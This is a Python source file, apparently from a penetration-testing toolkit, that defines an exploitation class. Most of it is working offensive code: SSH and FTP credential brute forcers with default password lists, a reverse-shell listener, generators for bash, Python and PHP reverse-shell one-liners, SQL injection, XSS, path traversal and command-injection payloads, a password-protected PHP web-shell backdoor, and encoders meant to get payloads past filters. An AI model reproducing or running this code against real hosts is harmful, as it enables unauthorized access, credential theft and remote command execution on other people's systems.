#!/usr/bin/env python3
"""
Exploitation Tools Module
Handles penetration testing and exploitation utilities

Author: NetTools Team
"""

import socket
import threading
import time
import ftplib
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional, Tuple
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False


class ExploitationTools:
    """Penetration testing and exploitation utilities."""
    
    def __init__(self):
        """Initialize exploitation tools."""
        self.reverse_shell_active = False
        self.shell_connection = None
        self.shell_thread = None
        self.max_threads = 10
        self.timeout = 5
        
        # Common credentials for brute force
        self.common_users = [
            'admin', 'administrator', 'root', 'user', 'guest',
            'postgres', 'mysql', 'oracle', 'sa', 'test',
            'demo', 'ftp', 'anonymous', 'www-data'
        ]
        
        self.common_passwords = [
            'password', 'admin', '123456', 'password123', 'admin123',
            'root', 'toor', 'pass', '12345', 'qwerty',
            'letmein', 'welcome', 'monkey', 'dragon', 'master',
            '', 'guest', 'login', 'changeme', 'default'
        ]
    
    def start_reverse_shell_listener(self, port: int, callback=None) -> bool:
        """
        Start reverse shell listener.
        
        Args:
            port: Port to listen on
            callback: Callback function for shell events
            
        Returns:
            True if listener started successfully
        """
        if self.reverse_shell_active:
            return False
        
        try:
            self.shell_thread = threading.Thread(
                target=self._reverse_shell_worker,
                args=(port, callback)
            )
            self.shell_thread.daemon = True
            self.shell_thread.start()
            self.reverse_shell_active = True
            return True
            
        except Exception:
            return False
    
    def stop_reverse_shell_listener(self):
        """Stop reverse shell listener."""
        self.reverse_shell_active = False
        if self.shell_connection:
            try:
                self.shell_connection.close()
            except Exception:
                pass
            self.shell_connection = None
    
    def _reverse_shell_worker(self, port: int, callback):
        """Worker thread for reverse shell listener."""
        server_socket = None
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind(('0.0.0.0', port))
            server_socket.listen(1)
            server_socket.settimeout(1)  # Non-blocking accept
            
            if callback:
                callback(f"Reverse shell listener started on port {port}")
            
            while self.reverse_shell_active:
                try:
                    client_socket, addr = server_socket.accept()
                    if callback:
                        callback(f"Connection received from {addr[0]}:{addr[1]}")
                    
                    self.shell_connection = client_socket
                    self._handle_shell_connection(client_socket, callback)
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if callback:
                        callback(f"Error in shell listener: {str(e)}")
                    break
                    
        except Exception as e:
            if callback:
                callback(f"Failed to start shell listener: {str(e)}")
        finally:
            if server_socket:
                server_socket.close()
            self.reverse_shell_active = False
    
    def _handle_shell_connection(self, client_socket, callback):
        """Handle incoming shell connection."""
        try:
            while self.reverse_shell_active:
                # Send prompt
                client_socket.send(b"$ ")
                
                # Receive command
                data = client_socket.recv(1024)
                if not data:
                    break
                
                command = data.decode('utf-8').strip()
                if callback:
                    callback(f"Command received: {command}")
                
                if command.lower() in ['exit', 'quit']:
                    break
                
                # Execute command (this is a simplified example)
                if command.startswith('echo '):
                    response = command[5:] + '\n'
                    client_socket.send(response.encode())
                else:
                    client_socket.send(b"Command executed\n")
                    
        except Exception as e:
            if callback:
                callback(f"Shell connection error: {str(e)}")
        finally:
            client_socket.close()
            self.shell_connection = None
    
    def ssh_brute_force(self, target: str, port: int = 22, 
                       userlist: List[str] = None, 
                       passlist: List[str] = None,
                       delay: float = 0.1) -> List[Dict]:
        """
        Perform SSH brute force attack.
        
        Args:
            target: Target host
            port: SSH port
            userlist: List of usernames to try
            passlist: List of passwords to try
            delay: Delay between attempts
            
        Returns:
            List of successful credentials
        """
        if not PARAMIKO_AVAILABLE:
            return [{"error": "Paramiko library not available"}]
        
        if userlist is None:
            userlist = self.common_users
        if passlist is None:
            passlist = self.common_passwords
        
        successful_creds = []
        attempts = []
        
        # Generate all combinations
        for username in userlist:
            for password in passlist:
                attempts.append((username, password))
        
        # Limit attempts to prevent overwhelming the target
        attempts = attempts[:50]
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            future_to_creds = {
                executor.submit(self._ssh_login_attempt, target, port, username, password): 
                (username, password) for username, password in attempts
            }
            
            for future in as_completed(future_to_creds):
                username, password = future_to_creds[future]
                try:
                    result = future.result()
                    if result:
                        successful_creds.append({
                            'username': username,
                            'password': password,
                            'target': target,
                            'port': port,
                            'timestamp': time.time()
                        })
                except Exception:
                    pass
                
                # Add delay to be less aggressive
                time.sleep(delay)
        
        return successful_creds
    
    def _ssh_login_attempt(self, host: str, port: int, username: str, 
                          password: str) -> bool:
        """Attempt SSH login with given credentials."""
        if not PARAMIKO_AVAILABLE:
            return False
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False
            )
            client.close()
            return True
            
        except Exception:
            return False
    
    def ftp_anonymous_test(self, target: str, port: int = 21) -> Dict:
        """
        Test for anonymous FTP access.
        
        Args:
            target: Target host
            port: FTP port
            
        Returns:
            Test results
        """
        result = {
            'target': target,
            'port': port,
            'anonymous_access': False,
            'banner': None,
            'directories': [],
            'files': [],
            'error': None
        }
        
        try:
            ftp = ftplib.FTP()
            ftp.connect(host=target, port=port, timeout=self.timeout)
            
            # Get banner
            result['banner'] = ftp.getwelcome()
            
            # Try anonymous login
            try:
                ftp.login('anonymous', 'anonymous@test.com')
                result['anonymous_access'] = True
                
                # List directories and files
                try:
                    items = []
                    ftp.retrlines('LIST', items.append)
                    
                    for item in items[:20]:  # Limit to 20 items
                        if item.startswith('d'):
                            result['directories'].append(item.split()[-1])
                        else:
                            result['files'].append(item.split()[-1])
                            
                except Exception:
                    pass
                    
            except ftplib.error_perm:
                result['anonymous_access'] = False
            
            ftp.quit()
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def ftp_brute_force(self, target: str, port: int = 21,
                       userlist: List[str] = None,
                       passlist: List[str] = None) -> List[Dict]:
        """
        Perform FTP brute force attack.
        
        Args:
            target: Target host
            port: FTP port
            userlist: List of usernames
            passlist: List of passwords
            
        Returns:
            List of successful credentials
        """
        if userlist is None:
            userlist = self.common_users
        if passlist is None:
            passlist = self.common_passwords
        
        successful_creds = []
        attempts = []
        
        # Generate combinations
        for username in userlist:
            for password in passlist:
                attempts.append((username, password))
        
        # Limit attempts
        attempts = attempts[:30]
        
        with ThreadPoolExecutor(max_workers=min(5, self.max_threads)) as executor:
            future_to_creds = {
                executor.submit(self._ftp_login_attempt, target, port, username, password):
                (username, password) for username, password in attempts
            }
            
            for future in as_completed(future_to_creds):
                username, password = future_to_creds[future]
                try:
                    result = future.result()
                    if result:
                        successful_creds.append({
                            'username': username,
                            'password': password,
                            'target': target,
                            'port': port,
                            'service': 'FTP',
                            'timestamp': time.time()
                        })
                except Exception:
                    pass
                
                time.sleep(0.5)  # Delay between attempts
        
        return successful_creds
    
    def _ftp_login_attempt(self, host: str, port: int, username: str, 
                          password: str) -> bool:
        """Attempt FTP login."""
        try:
            ftp = ftplib.FTP()
            ftp.connect(host=host, port=port, timeout=self.timeout)
            ftp.login(username, password)
            ftp.quit()
            return True
            
        except Exception:
            return False
    
    def generate_payload(self, payload_type: str, options: Dict = None) -> str:
        """
        Generate various payload types.
        
        Args:
            payload_type: Type of payload to generate
            options: Payload options
            
        Returns:
            Generated payload string
        """
        if options is None:
            options = {}
        
        if payload_type == "reverse_shell_bash":
            host = options.get('host', '127.0.0.1')
            port = options.get('port', 4444)
            return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
        
        elif payload_type == "reverse_shell_python":
            host = options.get('host', '127.0.0.1')
            port = options.get('port', 4444)
            payload = f"""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{host}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"""
            return payload
        
        elif payload_type == "reverse_shell_php":
            host = options.get('host', '127.0.0.1')
            port = options.get('port', 4444)
            return f"php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        
        elif payload_type == "sql_injection_union":
            columns = options.get('columns', 3)
            return f"' UNION SELECT {','.join(['NULL']*columns)}--"
        
        elif payload_type == "xss_basic":
            return "<script>alert('XSS')</script>"
        
        elif payload_type == "xss_advanced":
            return """<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">"""
        
        elif payload_type == "directory_traversal":
            depth = options.get('depth', 5)
            return "../" * depth + "etc/passwd"
        
        elif payload_type == "command_injection":
            command = options.get('command', 'id')
            return f"; {command} #"
        
        else:
            return "Unknown payload type"
    
    def test_command_injection(self, url: str, parameter: str, 
                              payloads: List[str] = None) -> List[Dict]:
        """
        Test for command injection vulnerabilities.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            payloads: List of command injection payloads
            
        Returns:
            List of potential vulnerabilities
        """
        if payloads is None:
            payloads = [
                "; id #",
                "| id #",
                "&& id",
                "|| id",
                "; whoami #",
                "; uname -a #",
                "`id`",
                "$(id)"
            ]
        
        vulnerabilities = []
        
        try:
            import requests
            session = requests.Session()
            
            for payload in payloads:
                try:
                    data = {parameter: payload}
                    response = session.post(url, data=data, timeout=10)
                    
                    # Check for command output indicators
                    indicators = ['uid=', 'gid=', 'groups=', 'Linux', 'Darwin', 'root']
                    
                    for indicator in indicators:
                        if indicator in response.text:
                            vulnerabilities.append({
                                'type': 'Command Injection',
                                'url': url,
                                'parameter': parameter,
                                'payload': payload,
                                'indicator': indicator,
                                'confidence': 'High'
                            })
                            break
                            
                except Exception:
                    continue
                    
        except ImportError:
            pass
        
        return vulnerabilities
    
    def create_backdoor_php(self, password: str = "backdoor") -> str:
        """
        Create a simple PHP backdoor.
        
        Args:
            password: Password for the backdoor
            
        Returns:
            PHP backdoor code
        """
        backdoor = f"""<?php
if (isset($_POST['cmd']) && $_POST['pass'] == '{password}') {{
    echo '<pre>';
    system($_POST['cmd']);
    echo '</pre>';
}} else {{
    echo '<form method="POST">
    Password: <input type="password" name="pass"><br>
    Command: <input type="text" name="cmd"><br>
    <input type="submit" value="Execute">
    </form>';
}}
?>"""
        return backdoor
    
    def encode_payload(self, payload: str, encoding_type: str) -> str:
        """
        Encode payload to bypass filters.
        
        Args:
            payload: Original payload
            encoding_type: Type of encoding
            
        Returns:
            Encoded payload
        """
        if encoding_type == "base64":
            return base64.b64encode(payload.encode()).decode()
        
        elif encoding_type == "url":
            import urllib.parse
            return urllib.parse.quote(payload)
        
        elif encoding_type == "hex":
            return payload.encode().hex()
        
        elif encoding_type == "unicode":
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        
        elif encoding_type == "html":
            html_entities = {
                '<': '&lt;', '>': '&gt;', '"': '&quot;', 
                "'": '&#x27;', '&': '&amp;'
            }
            encoded = payload
            for char, entity in html_entities.items():
                encoded = encoded.replace(char, entity)
            return encoded
        
        else:
            return payload
    
    def get_exploit_suggestions(self, service_info: Dict) -> List[Dict]:
        """
        Get exploit suggestions based on service information.
        
        Args:
            service_info: Service information from scanning
            
        Returns:
            List of exploit suggestions
        """
        suggestions = []
        
        service_name = service_info.get('name', '').lower()
        version = service_info.get('version', '').lower()
        port = service_info.get('port', 0)
        
        # SSH exploits
        if 'ssh' in service_name and port == 22:
            suggestions.append({
                'service': 'SSH',
                'exploit': 'Brute Force Attack',
                'description': 'Attempt to brute force SSH credentials',
                'risk': 'Medium',
                'method': 'ssh_brute_force'
            })
        
        # FTP exploits
        if 'ftp' in service_name and port == 21:
            suggestions.append({
                'service': 'FTP',
                'exploit': 'Anonymous Access',
                'description': 'Test for anonymous FTP access',
                'risk': 'Low',
                'method': 'ftp_anonymous_test'
            })
            
            suggestions.append({
                'service': 'FTP',
                'exploit': 'Brute Force Attack',
                'description': 'Attempt to brute force FTP credentials',
                'risk': 'Medium',
                'method': 'ftp_brute_force'
            })
        
        # HTTP/HTTPS exploits
        if service_name in ['http', 'https'] and port in [80, 443, 8080, 8443]:
            suggestions.append({
                'service': 'HTTP',
                'exploit': 'Directory Traversal',
                'description': 'Test for directory traversal vulnerabilities',
                'risk': 'High',
                'method': 'directory_traversal_test'
            })
            
            suggestions.append({
                'service': 'HTTP',
                'exploit': 'SQL Injection',
                'description': 'Test for SQL injection vulnerabilities',
                'risk': 'High',
                'method': 'sql_injection_test'
            })
        
        # Version-specific exploits
        if 'apache' in version:
            if '2.4.49' in version or '2.4.50' in version:
                suggestions.append({
                    'service': 'Apache',
                    'exploit': 'Path Traversal (CVE-2021-41773)',
                    'description': 'Apache 2.4.49/2.4.50 path traversal vulnerability',
                    'risk': 'Critical',
                    'method': 'apache_path_traversal'
                })
        
        return suggestions
    
    def get_status(self) -> Dict:
        """Get current status of exploitation tools."""
        return {
            'reverse_shell_active': self.reverse_shell_active,
            'shell_connection_active': self.shell_connection is not None,
            'paramiko_available': PARAMIKO_AVAILABLE,
            'max_threads': self.max_threads,
            'timeout': self.timeout
        }